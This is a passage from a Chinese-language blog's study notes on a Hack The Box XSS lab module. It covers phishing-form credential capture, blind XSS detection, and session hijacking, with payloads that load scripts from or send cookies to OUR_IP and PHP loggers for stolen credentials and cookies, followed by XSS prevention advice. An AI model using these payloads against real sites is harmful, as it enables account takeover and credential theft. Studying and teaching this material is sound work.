+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX</span><br><span class="line">GET /?username=test&amp;password=test&amp;submit=Login HTTP/1.1</span><br><span class="line">Host: 10.10.XX.XX</span><br><span class="line">...SNIP...</span><br></pre></td></tr></tbody></table></figure>
+
+<p>正如我们所看到的，我们可以在HTTP请求URL（<code>/?username=test&amp;password=test</code>）中捕获凭证。如果任何受害者尝试使用该表单登录，我们将获取他们的凭据。</p>
+<p>然而，由于我们只使用<code>netcat</code>侦听器进行侦听，因此它无法正确处理HTTP请求，受害者将获得<code>Unable to connect</code>错误，这可能会引起一些怀疑。因此，我们可以使用一个基本的PHP脚本记录HTTP请求中的凭据，然后将受害者返回到原始页面，而不进行任何注入。在这种情况下，受害者可能会认为他们成功登录并将按预期使用图像查看器。</p>
+<p>下面的PHP脚本应该可以完成我们所需要的工作，我们将把它写入VM上的一个文件，我们称之为<code>index.php</code>，并将其放在<code>/tmp/tmpserver/</code>（<code>don't forget to replace SERVER_IP with the ip from our exercise</code>）中：</p>
+<p>Code: </p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'password'</span>])) {</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">"creds.txt"</span>, <span class="string">"a+"</span>);</span><br><span class="line">    <span class="title function_ invoke__">fputs</span>(<span class="variable">$file</span>, <span class="string">"Username: <span class="subst">{$_GET['username']}</span> | Password: <span class="subst">{$_GET['password']}</span>\n"</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">"Location: http://SERVER_IP/phishing/index.php"</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在我们已经准备好了<code>index.php</code>文件，我们可以启动一个<code>PHP</code>监听服务器，我们可以使用它来代替我们之前使用的基本的<code>netcat</code>监听器：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ mkdir /tmp/tmpserver</span><br><span class="line">mikannse7@htb[/htb]$ cd /tmp/tmpserver</span><br><span class="line">mikannse7@htb[/htb]$ vi index.php #at this step we wrote our index.php file</span><br><span class="line">mikannse7@htb[/htb]$ sudo php -S 0.0.0.0:80</span><br><span class="line">PHP 7.4.15 Development Server (http://0.0.0.0:80) started</span><br></pre></td></tr></tbody></table></figure>
+
+<p>让我们尝试登录到注入的登录表单，看看我们得到什么。我们看到我们被重定向到原始图像查看器页面：                                                                                   </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_image_viewer.jpg" alt="img"></p>
+<p>如果我们检查Pwnbox中的<code>creds.txt</code>文件，我们会看到我们确实获得了登录凭据：                                           </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ cat creds.txt</span><br><span class="line">Username: test | Password: test</span><br></pre></td></tr></tbody></table></figure>
+
+<p>一切准备就绪后，我们可以启动PHP服务器并将包含XSS有效负载的URL发送给受害者，一旦他们登录到表单，我们将获得他们的凭据并使用它们访问他们的帐户。</p>
+<h2 id="Session-Hijacking"><a href="#Session-Hijacking" class="headerlink" title="Session Hijacking"></a>Session Hijacking</h2><p>现代Web应用程序使用Cookie来在不同的浏览会话中维护用户的会话。这使用户只需登录一次，即使他们在其他时间或日期访问同一网站，也可以保持登录会话有效。但是，如果恶意用户从受害者的浏览器获得cookie数据，他们可能能够在不知道其凭据的情况下获得受害者用户的登录访问权限。</p>
+<p>通过在受害者的浏览器上执行JavaScript代码的能力，我们可以收集他们的cookie并将其发送到我们的服务器，通过执行<code>Session Hijacking</code>（又名<code>Cookie Stealing</code>）攻击来劫持他们的登录会话。</p>
+<h3 id="Blind-XSS-Detection"><a href="#Blind-XSS-Detection" class="headerlink" title="Blind XSS Detection"></a>Blind XSS Detection</h3><p>我们通常通过尝试发现XSS漏洞是否存在以及在何处存在来启动XSS攻击。但是，在本练习中，我们将处理<code>Blind XSS</code>漏洞。当漏洞在我们无法访问的页面上触发时，就会发生Blind XSS漏洞。</p>
+<p>盲XSS漏洞通常发生在只有特定用户才能访问的表单中（例如，管理员）。一些可能的例子包括：</p>
+<ul>
+<li>Contact Forms</li>
+<li>Reviews</li>
+<li>User Details</li>
+<li>Support Tickets</li>
+<li>HTTP User-Agent headerHTTP User-Agent标头</li>
+</ul>
+<p>让我们在本节末尾的服务器上的（<code>/hijacking</code>）上的Web应用程序上运行测试。我们看到一个包含多个字段的User Registration页面，因此让我们尝试提交一个<code>test</code>用户，以查看表单如何处理数据：                                                                                                                                </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_blind_test_form.jpg" alt="img"></p>
+<p>正如我们所看到的，一旦我们提交表单，我们就会得到以下消息：                                                                                                                                                                                      <img src="https://academy.hackthebox.com/storage/modules/103/xss_blind_test_form_output.jpg" alt="img"></p>
+<p>这表明我们将无法看到我们的输入将如何处理，或者它将如何在浏览器中显示，因为它将只出现在我们无法访问的某个管理员面板中。在正常情况下（即，非盲）的情况下，我们可以测试每个字段，直到我们得到一个<code>alert</code>框，就像我们在整个模块中所做的那样。但是，由于我们在这种情况下无法访问管理面板，因此<code>how would we be able to detect an XSS vulnerability if we cannot see how the output is handled?</code></p>
+<p>为此，我们可以使用与上一节相同的技巧，即使用一个JavaScript有效负载将HTTP请求发送回我们的服务器。如果JavaScript代码被执行，我们将在机器上得到响应，我们将知道该页面确实容易受到攻击。</p>
+<p>然而，这引入了两个问题：</p>
+<ol>
+<li><code>How can we know which specific field is vulnerable?</code>由于任何字段都可能执行我们的代码，我们无法知道是哪个字段执行的。</li>
+<li><code>How can we know what XSS payload to use?</code>由于页面可能是脆弱的，但有效负载可能无法工作？</li>
+</ol>
+<h3 id="Loading-a-Remote-Script加载远程脚本"><a href="#Loading-a-Remote-Script加载远程脚本" class="headerlink" title="Loading a Remote Script加载远程脚本"></a>Loading a Remote Script加载远程脚本</h3><p>在HTML中，我们可以在<code>&lt;script&gt;</code>标签中编写JavaScript代码，但我们也可以通过提供其URL来包含远程脚本，如下所示：</p>
+<p>Code: 代码： htmlHTML</p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://OUR_IP/script.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>因此，我们可以使用它来执行在我们的VM上提供的远程JavaScript文件。我们可以将请求的脚本名称从<code>script.js</code>更改为我们注入的字段的名称，这样当我们在VM中获得请求时，我们可以识别执行脚本的易受攻击的输入字段，如下所示：</p>
+<p>Code: </p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://OUR_IP/username"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果我们收到一个针对<code>/username</code>的请求，那么我们就知道<code>username</code>字段容易受到XSS攻击，以此类推。这样，我们就可以开始测试加载远程脚本的各种XSS负载，看看哪一个会向我们发送请求。以下是我们可以从[PayloadsAllTheThings中](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS</a> Injection#blind-xss)使用的一些示例：</p>
+<p>Code: </p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://OUR_IP</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">'&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://OUR_IP</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://OUR_IP</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">b</span>(<span class="params"></span>){<span class="built_in">eval</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)};a=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();a.<span class="title function_">addEventListener</span>(<span class="string">"load"</span>, b);a.<span class="title function_">open</span>(<span class="string">"GET"</span>, <span class="string">"//OUR_IP"</span>);a.<span class="title function_">send</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$.<span class="title function_">getScript</span>(<span class="string">"http://OUR_IP"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>正如我们所看到的，各种有效负载都是从像<code>'&gt;</code>这样的注入开始的，它可能会工作，也可能不会工作，这取决于我们的输入在后端是如何处理的。如前所述，如果我们可以访问源代码（即，在DOM XSS中），可以精确地写入成功注入所需的有效负载。这就是为什么Blind XSS在DOM XSS类型的漏洞上有更高的成功率。</p>
+<p>在我们开始发送负载之前，我们需要在我们的VM上启动一个监听器，使用上一节中所示的<code>netcat</code>或<code>php</code>：                                             </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ mkdir /tmp/tmpserver</span><br><span class="line">mikannse7@htb[/htb]$ cd /tmp/tmpserver</span><br><span class="line">mikannse7@htb[/htb]$ sudo php -S 0.0.0.0:80</span><br><span class="line">PHP 7.4.15 Development Server (http://0.0.0.0:80) started</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在，我们可以开始逐个测试这些有效负载，方法是将其中一个用于所有输入字段，并在IP后面附加字段的名称，如前所述，例如：</p>
+<p>Code: 代码： htmlHTML</p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://OUR_IP/fullname</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> #this goes inside the full-name field</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://OUR_IP/username</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> #this goes inside the username field</span><br><span class="line">...SNIP...</span><br></pre></td></tr></tbody></table></figure>
+
+<p>提示：我们会注意到，即使我们尝试操作HTTP请求参数，电子邮件也必须匹配电子邮件格式，因为它似乎在前端和后端都经过验证。因此，电子邮件字段不会受到攻击，我们可以跳过测试。同样，我们可以跳过密码字段，因为密码通常是散列的，通常不会以明文显示。这有助于我们减少需要测试的潜在脆弱输入字段的数量。</p>
+<p>一旦我们提交了表单，我们等待几秒钟并检查我们的终端，看看是否有任何东西调用了我们的服务器。如果没有任何东西调用我们的服务器，那么我们可以继续下一个负载，等等。一旦我们收到对我们服务器的调用，我们应该注意我们使用的最后一个XSS负载作为工作负载，并注意调用我们服务器的输入字段名称作为易受攻击的输入字段。</p>
+<p><code>Try testing various remote script XSS  payloads with the remaining input fields, and see which of them sends an HTTP request to find a working payload</code>.</p>
+<h3 id="Session-Hijacking-1"><a href="#Session-Hijacking-1" class="headerlink" title="Session Hijacking"></a>Session Hijacking</h3><p>一旦我们找到一个有效的XSS负载并确定了易受攻击的输入字段，我们就可以继续利用XSS并执行会话劫持攻击。</p>
+<p>会话劫持攻击与我们在上一节中执行的网络钓鱼攻击非常相似。它需要一个JavaScript有效载荷来向我们发送所需的数据，并需要一个托管在我们服务器上的PHP脚本来抓取和解析传输的数据。</p>
+<p>我们可以使用多个JavaScript有效载荷来获取会话cookie并将其发送给我们，如[PayloadsAllTheThings](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS</a> Injection#exploit-code-or-poc)所示：</p>
+<p>Code: </p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">'http://OUR_IP/index.php?c='</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">'http://OUR_IP/index.php?c='</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用这两个有效载荷中的任何一个都可以向我们发送cookie，但我们将使用第二个，因为它只是向页面添加一个图像，这可能不是非常恶意的，而第一个导航到我们的cookie抓取器PHP页面，这可能看起来很可疑。</p>
+<p>我们可以将这些JavaScript有效负载中的任何一个写入<code>script.js</code>，它也将托管在我们的VM上：</p>
+<p>Code: </p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">'http://OUR_IP/index.php?c='</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在，我们可以将之前发现的XSS有效负载中的URL更改为使用<code>script.js</code>（<code>don't forget to replace OUR_IP with your VM IP in the JS script and the XSS payload</code>）：</p>
+<p>Code:</p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://OUR_IP/script.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>随着PHP服务器的运行，我们现在可以将代码用作XSS有效负载的一部分，将其发送到易受攻击的输入字段中，并且我们应该获得对具有cookie值的服务器的调用。但是，如果有很多Cookie，我们可能不知道哪个Cookie值属于哪个Cookie标头。因此，我们可以编写一个PHP脚本，用一个新行将它们拆分并写入文件。在这种情况下，即使多个受害者触发了XSS漏洞，我们也会将他们所有的cookie排序到一个文件中。</p>
+<p>我们可以保存下面的PHP脚本为<code>index.php</code>，然后重新运行PHP服务器：</p>
+<p>Code:</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])) {</span><br><span class="line">    <span class="variable">$list</span> = <span class="title function_ invoke__">explode</span>(<span class="string">";"</span>, <span class="variable">$_GET</span>[<span class="string">'c'</span>]);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$list</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) {</span><br><span class="line">        <span class="variable">$cookie</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">"cookies.txt"</span>, <span class="string">"a+"</span>);</span><br><span class="line">        <span class="title function_ invoke__">fputs</span>(<span class="variable">$file</span>, <span class="string">"Victim IP: <span class="subst">{$_SERVER['REMOTE_ADDR']}</span> | Cookie: <span class="subst">{$cookie}</span>\n"</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在，我们等待受害者访问易受攻击的页面并查看我们的XSS负载。一旦他们这样做，我们将在服务器上收到两个请求，一个是<code>script.js</code>，这反过来又会发出另一个带有cookie值的请求：                                                               </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">10.10.10.10:52798 [200]: /script.js</span><br><span class="line">10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如前所述，我们在终端中获得cookie值，正如我们所看到的。然而，由于我们准备了一个PHP脚本，我们也得到了一个带有干净cookie日志的<code>cookies.txt</code>文件：                                                </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ cat cookies.txt </span><br><span class="line">Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2</span><br></pre></td></tr></tbody></table></figure>
+
+<p>最后，我们可以在<code>login.php</code>页面上使用此Cookie来访问受害者的帐户。要做到这一点，一旦我们导航到<code>/hijacking/login.php</code>，我们可以在Firefox中单击<code>Shift+F9</code>，以显示开发人员工具中的<code>Storage</code>栏。然后，我们可以点击右上角的<code>+</code>按钮并添加我们的cookie，其中<code>Name</code>是我们被盗cookie中<code>=</code>之前的部分，<code>Value</code>是<code>=</code>之后的部分：                                                                                                   </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_blind_set_cookie_2.jpg" alt="img"></p>
+<p>一旦我们设置了cookie，我们就可以刷新页面，我们将以受害者的身份访问：</p>
+<h1 id="XSS-Prevention"><a href="#XSS-Prevention" class="headerlink" title="XSS Prevention"></a>XSS Prevention</h1><p>到目前为止，我们应该很好地了解什么是XSS漏洞及其不同类型，如何检测XSS漏洞以及如何利用XSS漏洞。我们将通过学习如何防御XSS漏洞来结束本模块。</p>
+<p>如前所述，XSS漏洞主要与Web应用程序的两个部分相关：<code>Source</code>（如用户输入字段）和<code>Sink</code>（显示输入数据）。这是我们在前端和后端都应该关注的两个主要问题。</p>
+<p>防止XSS漏洞的最重要方面是在前端和后端进行适当的输入清理和验证。除此之外，还可以采取其他安全措施来帮助防止XSS攻击。</p>
+<h2 id="Front-end"><a href="#Front-end" class="headerlink" title="Front-end"></a>Front-end</h2><p>由于Web应用程序的前端是获取大部分（但不是全部）用户输入的地方，因此必须使用JavaScript在前端清理和验证用户输入。</p>
+<h4 id="Input-Validation"><a href="#Input-Validation" class="headerlink" title="Input Validation"></a>Input Validation</h4><p>例如，在<code>XSS Discovery</code>部分的练习中，我们看到如果电子邮件格式无效，Web应用程序将不允许我们提交表单。这是通过以下JavaScript代码完成的：</p>
+<p>Code: </p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">validateEmail</span>(<span class="params">email</span>) {</span><br><span class="line">    <span class="keyword">const</span> re = <span class="regexp">/^(([^&lt;&gt;()[\]\\.,;:\s@\"]+(\.[^&lt;&gt;()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/</span>;</span><br><span class="line">    <span class="keyword">return</span> re.<span class="title function_">test</span>($(<span class="string">"#login input[name=email]"</span>).<span class="title function_">val</span>());</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>正如我们所看到的，这段代码正在测试<code>email</code>输入字段，并返回<code>true</code>或<code>false</code>是否匹配电子邮件格式的Regex验证。</p>
+<h4 id="输入消毒"><a href="#输入消毒" class="headerlink" title="输入消毒"></a>输入消毒</h4><p>除了输入验证之外，我们应该始终确保不允许任何包含JavaScript代码的输入，方法是转义任何特殊字符。为此，我们可以使用<a target="_blank" rel="noopener" href="https://github.com/cure53/DOMPurify">DOMPurify</a>JavaScript库，如下所示：</p>
+<p>Code: </p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"dist/purify.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="keyword">let</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>( dirty );</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这将使用反斜杠<code>\</code>转义任何特殊字符，这应该有助于确保用户不会发送任何带有特殊字符的输入（如JavaScript代码），这应该可以防止像DOM XSS这样的漏洞。</p>
+<h4 id="Direct-Inpu"><a href="#Direct-Inpu" class="headerlink" title="Direct Inpu"></a>Direct Inpu</h4><p>最后，我们应该始终确保我们永远不会在某些HTML标签中直接使用用户输入，例如：</p>
+<ol>
+<li>JavaScript code <code>&lt;script&gt;&lt;/script&gt;</code> </li>
+<li>CSS Style Code <code>&lt;style&gt;&lt;/style&gt;</code> </li>
+<li>Tag/Attribute Fields <code>&lt;div name='INPUT'&gt;&lt;/div&gt;</code> </li>
+<li>HTML Comments <code>&lt;!-- --&gt;</code></li>
+</ol>
+<p>如果用户输入到上述任何示例中，则可能会注入恶意JavaScript代码，这可能导致XSS漏洞。除此之外，我们应该避免使用允许更改HTML字段的原始文本的JavaScript函数，例如：</p>
+<ul>
+<li><code>DOM.innerHTML</code></li>
+<li><code>DOM.outerHTML</code></li>
+<li><code>document.write()</code></li>
+<li><code>document.writeln()</code></li>
+<li><code>document.domain</code></li>
+</ul>
+<p>以下是jQuery函数：</p>
+<ul>
+<li><code>html()</code></li>
+<li><code>parseHTML()</code></li>
+<li><code>add()</code></li>
+<li><code>append()</code></li>
+<li><code>prepend()</code></li>
+<li><code>after()</code></li>
+<li><code>insertAfter()</code></li>
+<li><code>before()</code></li>
+<li><code>insertBefore()</code></li>
+<li><code>replaceAll()</code></li>
+<li><code>replaceWith()</code></li>
+</ul>
+<p>当这些函数将原始文本写入HTML代码时，如果有任何用户输入，则可能包含恶意JavaScript代码，从而导致XSS漏洞。</p>
+<h2 id="Back-end"><a href="#Back-end" class="headerlink" title="Back-end"></a>Back-end</h2><p>另一方面，我们还应该确保在后端采取措施防止XSS漏洞，以防止存储和反射XSS漏洞。正如我们在<code>XSS Discovery</code>部分练习中看到的，即使它有前端输入验证，这也不足以阻止我们将恶意的有效负载注入表单。因此，我们也应该在后端采取XSS预防措施。这可以通过输入和输出清理和验证，服务器配置和后端工具来帮助防止XSS漏洞。</p>
+<h4 id="Input-Validation-1"><a href="#Input-Validation-1" class="headerlink" title="Input Validation"></a>Input Validation</h4><p>后端的输入验证与前端非常相似，它使用Regex或库函数来确保输入字段是预期的。如果不匹配，则后端服务器将拒绝它并且不显示它。</p>
+<p>PHP后端的E-Mail验证示例如下：</p>
+<p>Code: </p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$_GET</span>[<span class="string">'email'</span>], FILTER_VALIDATE_EMAIL)) {</span><br><span class="line">    <span class="comment">// do task</span></span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    <span class="comment">// reject input - do not display it</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>对于NodeJS后端，我们可以使用与前面提到的前端相同的JavaScript代码。</p>
+<h4 id="Input-Sanitization"><a href="#Input-Sanitization" class="headerlink" title="Input Sanitization"></a>Input Sanitization</h4><p>当涉及到输入清理时，后端起着至关重要的作用，因为前端输入清理可以通过发送自定义<code>GET</code>或<code>POST</code>请求轻松绕过。幸运的是，各种后端语言都有非常强大的库，可以正确地清理任何用户输入，这样我们就可以确保不会发生注入。</p>
+<p>例如，对于PHP后端，我们可以使用<code>addslashes</code>函数通过用反斜杠转义特殊字符来清理用户输入：</p>
+<p>Code: </p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">'email'</span>])</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在任何情况下，用户直接输入（例如<code>$_GET['email']</code>）都不应该直接显示在页面上，因为这可能导致XSS漏洞。</p>
+<p>对于NodeJS后端，我们也可以像使用前端一样使用<a target="_blank" rel="noopener" href="https://github.com/cure53/DOMPurify">DOMPurify</a>库，如下所示：</p>
+<p>Code:</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">DOMPurify</span> <span class="keyword">from</span> <span class="string">'dompurify'</span>;</span><br><span class="line"><span class="keyword">var</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(dirty);</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="Output-HTML-Encoding"><a href="#Output-HTML-Encoding" class="headerlink" title="Output HTML Encoding"></a>Output HTML Encoding</h4><p>在后端需要注意的另一个重要方面是<code>Output Encoding</code>。这意味着我们必须将任何特殊字符编码到它们的HTML代码中，如果我们需要显示整个用户输入而不引入XSS漏洞，这将很有帮助。对于PHP后端，我们可以使用<code>htmlspecialchars</code>或<code>htmlentities</code>函数，它们将某些特殊字符编码到HTML代码中（例如<code>&lt;</code>到<code>&amp;lt</code>），因此浏览器将正确显示它们，但它们不会引起任何类型的注入：</p>
+<p>Code: </p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">htmlentities</span>(<span class="variable">$_GET</span>[<span class="string">'email'</span>]);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>对于NodeJS后端，我们可以使用任何进行HTML编码的库，如<code>html-entities</code>，如下所示：</p>
+<p>Code: </p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> encode <span class="keyword">from</span> <span class="string">'html-entities'</span>;</span><br><span class="line"><span class="title function_">encode</span>(<span class="string">'&lt;'</span>); <span class="comment">// -&gt; '&amp;lt;'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>一旦我们确保所有用户输入都经过验证、清理并在输出上进行编码，我们就应该大大降低XSS漏洞的风险。</p>
+<h4 id="Server-Configuration"><a href="#Server-Configuration" class="headerlink" title="Server Configuration"></a>Server Configuration</h4><p>除了上述之外，还有一些后端Web服务器配置可以帮助防止XSS攻击，例如：</p>
+<ul>
+<li>在整个域中使用HTTPS。</li>
+<li>使用XSS预防头。</li>
+<li>为页面使用适当的Content-Type，如<code>X-Content-Type-Options=nosniff</code>。</li>
+<li>使用<code>Content-Security-Policy</code>选项，如<code>script-src 'self'</code>，仅允许本地托管脚本。</li>
+<li>使用<code>HttpOnly</code>和<code>Secure</code> cookie标志阻止JavaScript阅读cookie，并仅通过HTTPS传输它们。</li>
+</ul>
+<p>除此之外，良好的<code>Web Application Firewall (WAF)</code>还可以显著降低XSS攻击的机会，因为它会自动检测通过HTTP请求的任何类型的注入，并自动拒绝此类请求。此外，有些框架提供了内置的XSS保护，比如<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-7.0">ASP.NET</a>。</p>
+<p>最后，我们必须尽最大努力使用这种XSS预防技术来保护我们的Web应用程序免受XSS漏洞的攻击。即使所有这些都完成了，我们也应该练习我们在本模块中学到的所有技能，并尝试识别和利用任何潜在输入字段中的XSS漏洞，因为安全编码和安全配置仍然可能留下漏洞和漏洞。如果我们使用<code>offensive</code>和<code>defensive</code>技术来保护网站，我们应该达到一个可靠的安全级别来抵御XSS漏洞。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2023/11/17/Cross-Site%20Scripting%20(XSS)HTB/">http://mikannse.space/2023/11/17/Cross-Site Scripting (XSS)HTB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E5%AE%89/">网安</a><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/18/Web%20RequestsHTB/" title="Web RequestsHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Web RequestsHTB</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/15/Information%20Gathering%20-%20Web%20EditionHTB/" title="Information Gathering - Web EditionHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Information Gathering - Web EditionHTB</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas 